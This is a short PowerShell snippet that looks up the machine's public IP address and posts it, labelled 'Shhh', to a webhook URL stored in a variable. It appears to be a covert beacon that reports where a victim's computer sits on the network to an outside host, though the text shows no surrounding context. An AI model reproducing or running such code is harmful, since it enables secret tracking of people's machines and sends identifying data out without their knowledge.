$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content = "Shhh : $ip"} | ConvertTo-Json)
